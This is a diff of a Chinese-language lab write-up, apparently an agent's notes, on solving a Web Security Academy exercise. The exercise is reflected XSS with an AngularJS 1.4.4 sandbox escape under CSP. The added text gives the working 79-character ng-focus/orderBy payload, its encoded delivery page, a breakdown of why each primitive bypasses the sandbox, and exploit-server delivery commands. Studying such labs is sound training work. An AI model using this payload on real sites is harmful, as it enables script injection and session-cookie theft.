@@ -1,8 +1,5 @@
 ---
-title: "lab-angular-sandbox-escape-and-csp"
-links:
-  - target: client-side-template-injection-family
-    relation: evidences
+title: lab-angular-sandbox-escape-and-csp
 ---
 
 # lab-angular-sandbox-escape-and-csp
@@ -10,39 +7,46 @@ links:
 > evidences: [[client-side-template-injection-family]]
 
 - 题面:Reflected XSS with AngularJS sandbox escape and CSP(/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
-- 实例(批38):https://0a6100080471e4d680ec12c300ae00a5.web-security-academy.net(exploit 0a87003c044ee4d980e311b9014b00ab)
-- 判定目标:CSP 下逃逸 AngularJS 沙箱并 `alert(document.cookie)`;状态:**unresolved**(批38 把未决面收窄到"触发时机 × 80 字符预算"的算术冲突)
+- 实例(批45R):https://0a250081046e102e84926863003900e5.web-security-academy.net · exploit:https://exploit-0a32003704b510d4847467ca013f005b.exploit-server.net
+- 判定目标:CSP(`script-src 'self'` + `ng-csp`)下逃逸 AngularJS 沙箱并 `alert(document.cookie)`;状态:**solved**(横幅 `<h4>Congratulations, you solved the lab!</h4>`,`banner_verdict.solved=true`)
 
-## 已确认
+## 收口载荷(79/80 字符,一次交付即翻牌)
 
-1. `?search=` 原样反射进 `<h1>0 search results for '…'</h1>`;`<body ng-app ng-csp>`,`angular_1-4-4.js`,CSP `script-src 'self'`(内联脚本/内联事件全挡,
-   只能走 Angular 表达式);长度上限 **80**(81+ -> 400)。
-2. 可用链(批24 实证):`$event.composedPath()` 通过 expensive 检查 -> `|orderBy:'(y=alert)(document.cookie)'` 以数组元素为 scope 求值,
-   末元素是 window -> 赋值式调用绕开 isecwindow;**79 字符**载荷字面量(ng 冒号属性形;载荷不带闭合 `>`,由反射上下文补):`/?search=<input id=x ng:focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)' #x`
-3. **批38 关键诊断(本机 Chrome,browser_suite eval)**:
-   - `$event.path` 在本版 Chrome 是 **undefined** => 省 10 字符的短写法不可用(只有 `composedPath()` 21 字符可用)。
-   - 链本身没问题:手工 dispatch focus + 捕获 alert -> `{"alerted":""}`(空 cookie,链条正确)。
-   - **但片段聚焦不触发**:注入的 `<input id=x …>` 确实成了 `document.activeElement.id==="x"`,却**没有** ng-focus 效果
-     => 片段聚焦发生在 Angular 编译(挂 ng-focus 监听)之前 => 79 字符载荷在"加载即触发"这条路上**结构性不可靠**。
-   - 确定性触发 `autofocus`(浏览器在 load 时 flush,晚于 bootstrap)需要 **84 字符 > 80** 。
-4. 交付已补齐(批24 缺的一步):exploit server STORE + DELIVER_TO_VICTIM,
-   `responseBody=<script>location='<inst>/?search=<ENC>#x'</script>`;另试过 iframe+setTimeout 改 hash 的二次片段导航 -- **均未翻**。
+```
+https://<inst>/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>#x
+交付页: <script>location='https://<inst>/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath()%7CorderBy%3A%27(y%3Dalert)(document.cookie)%27%3E#x'</script>
+```
 
-## 未决面(更锐利)
+- 长度上限是服务端硬约束:81+ → 400 正文 `"Search term cannot exceed 80 characters"`。
+- 触发:`#x` 片段聚焦即可,**不需要 `autofocus`**(它 +10 字符会撑破预算)。批38 判「片段聚焦早于 bootstrap」是**假阴性**——见下「聚焦态」。
+- 执行原语:`$event.composedPath()`(21,取到含 window 的数组,expensive 检查只查数组本身)→ `|orderBy:'<谓词>'`(字符串谓词由非 expensive 的 `$parse` 编译、**以每个数组元素为 scope** 求值,末元素 window)→ `(y=alert)(document.cookie)`(赋值式调用绕开 isecwindow;裸 `alert(...)` 报 `[$parse:isecwindow]`)。
 
-- 冲突:能在编译后触发的只有 `autofocus`(+10)与 `$event.path`(-10)同类替换;当前约束下
-  `composedPath()`(21)+ 赋值式 alert 参数(28)在 80 字符内放不下 `autofocus`。需要
-  (a) ≤80 且能在编译后触发的**事件**替代(Ng 在 CSP 模式支持的事件列表:focus/blur/change/click/key* 等,均为交互或加载时序),
-  或 (b) 更短的"取 window"原语(本版 Chrome 无 `event.path`;`event.view` 被 isecwindow 拦),
-  或 (c) 更短的 alert 参数写法。
-- 下一步:用 `lab_alert --driver` 枚举候选(每次 `blur();focus()` 触发)以区分"载荷语法"与"触发时机";再试 `<input autofocus ng-focus=…>` 的 84 字符版本
-  能否绕过长度检查(如重复参数/多参数拆分)。
+## 关键判读细节(勘误 + 武器级)
+
+1. **只有字符串形谓词逐元素求值**:`|filter:'…'` → `Maximum call stack size exceeded`(filterFilter 对字符串走子串匹配,遇 window 递归);`|orderBy:(y=alert)(document.cookie)`(不带引号)→ **参数只在外层 scope 求值一次,是空操作**(实测返回数组、无 alert)。必须 `orderBy:'…'`。
+2. **聚焦态是判读前提**:`document.hasFocus()===false` 时 Chrome 只设 `document.activeElement`、**不发 focus 事件** ⇒ 所有 focus 触发链在 harness 浏览器里系统性假阴性。`Page.bringToFront` 后 `hasFocus=true`,同一载荷 `page_alert` 立刻 `fired=true, alerts:["alert:"]`。先 `browser_suite call Page.bringToFront`(或 `Emulation.setFocusEmulationEnabled`)再判 focus 类载荷。
+3. oracle 法(不必真导航):页面内 `angular.element(document.body).injector().get('$parse')(EXPR,null,true)(scope,{$event:{composedPath:()=>path}})`;`path` 用 `el.dispatchEvent(new FocusEvent('focus'))` 期间 `e.composedPath()` 捕获。
 
 ## 证据摘录
 
 ```
-browser_suite eval: $parse("$event.composedPath()|orderBy:'(y=alert)(document.cookie)'") + 手工 focus -> {"alerted":""}   # 链通,cookie 为空
-browser_suite eval: (new Event('focus')).path -> "undefined"                                                              # 短写法不可用
-browser_suite eval: goto 带 #x 的载荷页 -> activeId="x", 但无 alert(fragment 聚焦早于 ng-focus 挂载)
-lab_alert "<inst>/?search=<79B 载荷>#x" -> alerts:[] fired:false ; 交付(exploit server)-> solved_check false
+banner_verdict → {"solved":true,"solved_class":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
+page_alert "<载荷URL>#x" → {"fired":true,"alerts":["alert:"]}          # cookie 为空 ⇒ 消息为 ""
+$parse oracle: orderBy:'(y=alert)(document.cookie)' → log [""] ; filter 形 → Maximum call stack ; 无引号形 → 无动作
+100 字符探测 → 400 "Search term cannot exceed 80 characters"
 ```
+
+## 复现命令
+
+```
+range_launch launch 978FEBC1…9A51C363 --jar ~/.pi-rs/agent/chrome-jar.json
+browser_suite call Page.bringToFront
+page_alert "https://<inst>/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath()%7CorderBy%3A%27(y%3Dalert)(document.cookie)%27%3E#x"
+http_session post "https://<exploit>/" --jar <jar> --follow --form urlIsHttps=on --form responseFile=/exploit \
+  --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: text/html' \
+  --form 'responseBody=<script>location='"'"'https://<inst>/?search=…%27%3E#x'"'"'</script>' --form formAction=DELIVER_TO_VICTIM
+```
+
+## 关系
+
+- 族:[[client-side-template-injection-family]](CSP 变体行);沙箱细节见 [[angularjs-1-4-4-sandbox-escape-practice-notes]]。
